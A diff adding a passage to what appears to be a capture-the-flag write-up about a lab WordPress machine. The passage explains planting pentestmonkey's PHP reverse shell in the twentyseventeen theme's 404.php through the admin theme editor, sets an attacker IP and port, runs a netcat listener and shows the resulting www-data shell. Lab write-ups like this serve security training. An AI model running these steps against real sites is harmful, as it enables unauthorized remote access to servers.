@@ -72,3 +72,30 @@ We will use these given credentials to login on the admin panel
 After successfully logging in the admin panel, we get prompted with question if we want to update the admin email or leave it as it is.
 We will skip on this one because our goal is getting webshell or reverse shell.
 For this purposes idea is to edit built-in pages with the malicious code which will execute under condition that we visit website.
+
+So twentyseventeen is a theme. Themes got their own custom 404 page that will run when you visit non-existing page. So for a fact we know that we can modify that page which we will do.
+Through the admin panel, we can see the side menu on left side which contains tab themes.
+So the path is `Themes>>Theme editor>>404.php`
+
+`https://github.com/pentestmonkey/php-reverse-shell`is great for these purposes as it can run as logic bomb when visited. You can download it, modify by just adding your ip address and port as following:
+```
+$ip = '10.8.22.53';  // CHANGE THIS TO YOUR IP
+$port = 1234;       // CHANGE THIS TO WANTED PORT
+```
+And you can finally start your connection listener on all interfaces by running `nc -lvnp 1234` in your command line.
+After pasting whole reverse shell code in the 404 template you can press `Publish` and visit the page with following url http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+Bingo! Reverse shell!
+```
+$ nc -lvnp 1234            
+listening on [any] 1234 ...
+connect to [10.8.22.53] from (UNKNOWN) [10.10.247.233] 54424
+Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 18:52:46 up  3:37,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+We got access as `www-data`
+
+## Internal recon
